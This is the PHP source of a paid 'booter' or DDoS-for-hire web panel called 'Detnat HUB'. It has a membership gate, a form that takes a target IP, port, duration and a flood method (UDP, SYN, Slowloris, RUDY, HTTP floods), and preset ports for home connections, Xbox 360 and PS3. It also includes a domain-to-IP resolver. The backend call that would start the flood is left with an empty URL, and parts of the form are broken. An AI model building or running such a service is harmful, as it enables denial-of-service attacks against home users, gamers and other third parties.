<?php
ob_start();
require_once 'includes/db.php';
require_once 'includes/init.php';
if (!($user -> LoggedIn()))
{
	header('location: login.php');
	die();
}
if (!($user->hasMembership($odb)))
{
	header('location: purchase.php');
	die();
}
if (!($user -> notBanned($odb)))
{
	header('location: login.php');
	die();
}
function opensite($url)
       {      
       $ch = curl_init();
       $timeout = 2;
       curl_setopt($ch,CURLOPT_URL,$url);
       curl_setopt($ch, CURLOPT_TIMEOUT, 3);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
       $data = curl_exec($ch);
       curl_close($ch);
       
       }
?>
<!DOCTYPE html>
<!--[if IE 8]>    <html class="no-js ie8 ie" lang="en"> <![endif]-->
<!--[if IE 9]>    <html class="no-js ie9 ie" lang="en"> <![endif]-->
<!--[if gt IE 9]><!--> <html class="no-js" lang="en"> <!--<![endif]-->
	<head>
		<meta charset="utf-8">
		<title><?php echo $title_prefix; ?>Hub</title>
		<meta name="description" content="">
		<meta name="author" content="Walking Pixels | www.walkingpixels.com">
		<meta name="robots" content="index, follow">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">

		<!-- jQuery TagsInput Styles -->
		<link rel='stylesheet' type='text/css' href='css/plugins/jquery.tagsinput.css'>
		
		<!-- jQuery jWYSIWYG Styles -->
		<link rel='stylesheet' type='text/css' href='css/plugins/jquery.jwysiwyg.css'>
		
		<!-- Bootstrap wysihtml5 Styles -->
		<link rel='stylesheet' type='text/css' href='css/plugins/bootstrap-wysihtml5.css'>

		<!-- Style -->
		<link rel="stylesheet" href="css/lindworm-blue.css">
		
		<!-- Favicon -->
		<link rel="shortcut icon" href="favicon.ico">
		
		<!-- JS Libs -->
		<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.1/jquery.min.js"></script>
		<script>window.jQuery || document.write('<script src="js/libs/jquery.js"><\/script>')</script>
		<script src="js/libs/modernizr.js"></script>
		<script src="js/libs/selectivizr.js"></script>
		
		<script>
			$(document).ready(function(){
				
				// Tabs
				$('.demoTabs a').click(function (e) {
					e.preventDefault();
					$(this).tab('show');
				})

				// Sidebar slide
				$('.nav-slide').pageslide();
				$(window).resize(function() {
					$.pageslide.close();
				});

				// Tooltips
				$('.user-profile-actions li a').tooltip({
					placement: 'bottom'
				});

			});
		</script>
		
	<body>
		
		<!-- Wrap all page content for sticky footer -->
		<div id="wrapper">

			<!-- Main page container -->
			<div class="container">

				<!-- Secondary navigation -->
				<ul class="secondary-navigation">
					<li><a href="#">Settings</a>
					<li><a href="#">Logout</a>
				</ul>
				<!-- /Secondary navigation -->

				<!-- Container style -->
				<div class="container-inner">

					<!-- Left (navigation) side -->
<?php include('sidebar.php'); ?>
					<!-- /Left (navigation) side -->

					<!-- Right (content) side -->
					<!-- Main content -->
					<div class="content">
				
						<!-- Page container -->
						<section class="page-container" role="main">

							<!-- Nav slide button -->
							<a class="nav-slide" href="#nav">
								<span class="icon-align-justify"></span>
							</a>
							
							<!-- Breadcrumbs -->
							<ul class="breadcrumb">
								<li><a href="#"><span class="icon-home"></span>Home</a> <span class="icon-chevron-right"></span></li>
								<li class="active">Hub</li>
							</ul>
							<!-- Breadcrumbs -->
						
							
							<!-- Grid row -->
							<div class="row-fluid">
							
								<!-- Data (buttons) block -->
								<article class="span12 data-block tabbed-block highlight highlight-red">
									<div class="data-container">
										<header>
											<h2>HUB</h2>
											<ul class="data-header-actions tabs">
												<li class="demoTabs active"><a href="#horizontal">Detnat HUB</a></li>
											</ul>
										</header>

										<!--Attack Curl Configurations -->
										<?php
		if (isset($_POST['attackBtn']))
		{
			$host = $_POST['host'];
			$port = intval($_POST['port']);
			$time = intval($_POST['time']);
			$method = $_POST['method']; 
            $user = $_SESSION['username'];
			$errors = array();

			if (empty($host) || empty($time) || empty($port) || empty($method))
			{
				$errors[] = 'Please verify all fields';
			}
			if (!filter_var($host, FILTER_VALIDATE_IP))
			{
				$errors[] = 'Host is invalid';
			}
			$allowedMethods = array('udp', 'ssyn', 'arme', 'get', 'post', 'head', 'rudy', 'slow', 'stop', 'essyn', 'udp-lag');
			if (!in_array($method, $allowedMethods))
			{
				$errors[] = 'Method is invalid';
			}
			$SQLCheckBlacklist = $odb -> prepare("SELECT COUNT(*) FROM `blacklist` WHERE `IP` = :host");
			$SQLCheckBlacklist -> execute(array(':host' => $host));
			$countBlacklist = $SQLCheckBlacklist -> fetchColumn(0);
			if ($countBlacklist > 0)
			{
				$errors[] = 'IP was blacklisted by an admin';
			}
			if (empty($errors))
			{
				$checkRunningSQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username  AND `time` + `date` > UNIX_TIMESTAMP()");
				$checkRunningSQL -> execute(array(':username' => $_SESSION['username']));
				$countRunning = $checkRunningSQL -> fetchColumn(0);
				if ($countRunning == 0)
				{
					$SQLGetTime = $odb -> prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
					$SQLGetTime -> execute(array(':id' => $_SESSION['ID']));
					$maxTime = $SQLGetTime -> fetchColumn(0);
					if (!($time > $maxTime))
					{
						$insertLogSQL = $odb -> prepare("INSERT INTO `logs` VALUES(:user, :ip, :port, :time, :method, UNIX_TIMESTAMP())");
						$insertLogSQL -> execute(array(':user' => $_SESSION['username'], ':ip' => $host, ':port' => $port, ':time' => $time, ':method' => $method));
						echo '<div class="nNote nSuccess hideit"><p><strong>SUCCESS: </strong>Attack has been sent to '.$host.':'.$port.' for '.$time.' seconds using '.$method.'</p></div>';
						
						
							opensite("");

						
						
					}
					else
					{
						echo '<div class="nNote nFailure hideit"><p><strong>ERROR: </strong>Your max boot time is '.$maxTime.'</p></div>';
					}
				}
				else
				{
					echo '<div class="nNote nFailure hideit"><p><strong>ERROR: </strong>You currently have a boot running.  Please wait for it to be over.</p></div>';
				}
			}
			else
			{
				echo '<div class="nNote nFailure hideit"><p><strong>ERROR:</strong><br />';
				foreach($errors as $error)
				{
					echo '-'.$error.'<br />';
				}
				echo '</div>';
		}
		}
				if (isset($_POST['stopBtn']))
		{
		
		$checkRunningSQL = $odb -> prepare("SELECT ip,port,time,method,user,date FROM `logs` WHERE `user` = :username  AND `time` + `date` > UNIX_TIMESTAMP()");
		$checkRunningSQL -> execute(array(':username' => $_SESSION['username']));
		$getserver2 = $checkRunningSQL -> fetchAll();
		$count = $checkRunningSQL -> rowCount();
		$user = $_SESSION['username'];
		
		if ($count == 1)
		{				
							opensite("");
		}

		$updatepid = $odb -> prepare("UPDATE `logs` SET `time`=:timeto WHERE `user`= :user AND `date`= :date");
		
		echo '<div class="nNote nSuccess hideit"><p><strong>SUCCESS: </strong>Stress Has Been Stopped But You Must Wait The Remainder To Attack Again</p></div>';	
		
		}
		?>
										
										
										<!-- Tab content -->
										<section class="tab-content">
													
											<!-- Tab #horizontal -->
											<div class="tab-pane fade in active" id="horizontal">
											
												<!-- Grid row -->
												<div class="row-fluid">

													<article class="span12 data-block data-block-alt">
														<div class="data-container">

															<section>
																<form class="form-horizontal">
																	<fieldset>
																		<legend>Boot</legend>
																		<div class="control-group">
																			<label class="control-label" for="input">Target IP</label>
																			<div class="controls">
																				<input id="input" class="input-xlarge" type="text">
																				<p class="help-block">The IP to Attack</p>
																			</div>
																		</div>
																		<div class="control-group">
																			<label class="control-label" for="input">Port</label>
																			<div class="formRow">
																			<select name="portSelect" onchange="this.form.elements['port'].value=this.value">
																			<option value="">Select A Preset Port</option>
																			<option value="80">Home Connection: (80) </option>
																			<option value="3074">Xbox360: (3074)</option>
																			<option value="3478">PS3: (3478)</option>
																			</select>
																			</div>
																		</div>
																		<div class="control-group">
																			<label class="control-label" for="input">Time</label>
																			<div class="controls">
																				<input id="input" class="input-xlarge" type="text">
																				<p class="help-block">How long should we attack</p>
																			</div>
																		</div>																		
																		<div class="row">
      <label for="method"></label>

                  <div class="formRow">
                        <label for="labelFor">Method</label>
                        <div class="formRight">
       <select name=method id=method>
<optgroup label="Layer-4">
                                <option value="udp" selected>UDP</option>
                                <option value="ssyn">SSYN</option>
								<option value="udp-lag">UDP-LAG</option>
                              </optgroup>
                            
                              <optgroup label="Layer-7">
                                  <option value="rudy">RUDY</option>
                                  <option value="arme">ARME</option>
                                  <option value="get">GET</option>
                                  <option value="head">HEAD</option>
                                  <option value="post">POST</option>
                                  <option value="slow">SLOWLORIS</option>
								  <option value="essyn">ESSYN</option>
                              </optgroup>
       </select>
      </div>
																		<!--Attack and stop button -->
																		<div class="form-actions">
																			<button class="btn btn-alt btn-large btn-primary" type="submit" name="attackBtn">Send Attack</button>
																			<button class="btn btn-alt btn-large btn-danger" type="submit" name="stopBtn">Stop Attack</button>
																		</div>
																		
																		<!--Domain To IP RESOLVER -->
																		<?php 
		$resolved = '';
		$domain = '';
		if (isset($_POST['resolveBtn']))
		{
			$domain = $_POST['domain'];
			$resolved = gethostbyname($domain);
		}
		?>
		<form action="" class="form" method="POST">
            <fieldset>
                <div class="widget">
                    <div class="title"><h6>Host To IP</h6></div>
                    <div class="formRow">
                        <label>Domain Name</label>
                        <div class="formRight"><input type="text" name="domain" value="<?php echo $domain; ?>"/></div>
                        <div class="clear"></div>
                    </div>
					<div class="formRow">
						<?php echo $resolved;?>
						<input type="submit" value="Resolve" name="resolveBtn" class="btn btn-alt btn-large btn-primary" />
						<div class="clear"></div>
                    </div>
                </div>
            </fieldset>
        </form> 
																		
																	</fieldset>
																</form>
															</section>

														</div>
													</article>

												</div>
												<!-- /Grid row -->

											</div>
											<!-- Tab #horizontal -->
												
										</section>
										<!-- /Tab content -->

									</div>
								<article>
								<!-- /Data (buttons) block -->

							</div>
							<!-- /Grid row -->
					

						</section>
						<!-- /Page container -->

					</div>
					<!-- /Main content -->
					<!-- /Right (content) side -->

				</div>
				<!-- /Container style -->

			</div>
			<!-- /Main page container -->

			<!-- Push space for footer -->
			<div id="push"></div>
			
		</div>
		<!-- /Wrap all page content for sticky footer -->

		<!-- Main footer -->
		<footer id="footer">
			<ul>
				<li>Built with love on <a href="http://twitter.github.com/bootstrap/">Twitter Bootstrap</a> by <a href="http://www.walkingpixels.com/">Walking Pixels</a>.</li>
				<li><a href="#">Blog</a></li>
				<li><a href="#">Documentation</a></li>
				<li><a href="#">Support</a></li>
			</ul>
		</footer>
		<!-- /Main footer -->

		<!-- Scripts -->
		<script src="js/navigation.js"></script>

		<!-- Bootstrap scripts -->
		<script src="js/bootstrap/bootstrap.min.js"></script>
		
		<!-- Fileupload and Inputmask plugin -->
		<script src="js/plugins/fileupload/bootstrap-fileupload.js"></script>
		<script src="js/plugins/inputmask/bootstrap-inputmask.js"></script>
		
		<!-- jQuery TagsInput -->
		<script src="js/plugins/tagsInput/jquery.tagsinput.min.js"></script>
		
		<script>
			$(document).ready(function() {
			
				$('.tagsinput').tagsInput();
			
			});
		</script>
		
		<!-- jQuery jWYSIWYG -->
		<script src="js/plugins/jWYSIWYG/jquery.wysiwyg.js"></script>
		
		<script>
			$(document).ready(function() {
				
				$('.wysiwyg').wysiwyg({
					controls: {
						bold          : { visible : true },
						italic        : { visible : true },
						underline     : { visible : true },
						strikeThrough : { visible : true },
						
						justifyLeft   : { visible : true },
						justifyCenter : { visible : true },
						justifyRight  : { visible : true },
						justifyFull   : { visible : true },
			
						indent  : { visible : true },
						outdent : { visible : true },
			
						subscript   : { visible : true },
						superscript : { visible : true },
						
						undo : { visible : true },
						redo : { visible : true },
						
						insertOrderedList    : { visible : true },
						insertUnorderedList  : { visible : true },
						
						cut   : { visible : true },
						copy  : { visible : true },
						paste : { visible : true },
						
						code : { visible : false }
					},
					events: {
						click: function(event) {
							if ($("#click-inform:checked").length > 0) {
								event.preventDefault();
								alert("You have clicked jWysiwyg content!");
							}
						}
					}
				});
				
			});
		</script>
		
		<!-- Wysihtml5 -->
		<script src="js/plugins/wysihtml5/wysihtml5-0.3.0.js"></script>
		<script src="js/plugins/wysihtml5/bootstrap-wysihtml5.js"></script>
		
		<script>
			$(document).ready(function() {
				
				$('.wysihtml5').wysihtml5();
				
			});
		</script>
		
		<!-- Colorpicker -->
		<script src="js/plugins/colorpicker/bootstrap-colorpicker.js"></script>
		
		<script>
			$(document).ready(function() {
				
				var preview = $('.colorpicker-preview')[0].style;
				$('.colorpicker').colorpicker().on('changeColor', function(ev){
					preview.backgroundColor = ev.color.toHex();
				});
				
			});
		</script>
		
		<!-- Datepicker -->
		<script src="js/plugins/datepicker/bootstrap-datepicker.js"></script>
		
		<script>
			$(document).ready(function() {
				
				$('.datepicker').datepicker();
				
			});
		</script>
		
		<!-- Page slide plugin -->
		<script src="js/plugins/pageSlide/jquery.pageslide.min.js"></script>

	</body>
</html>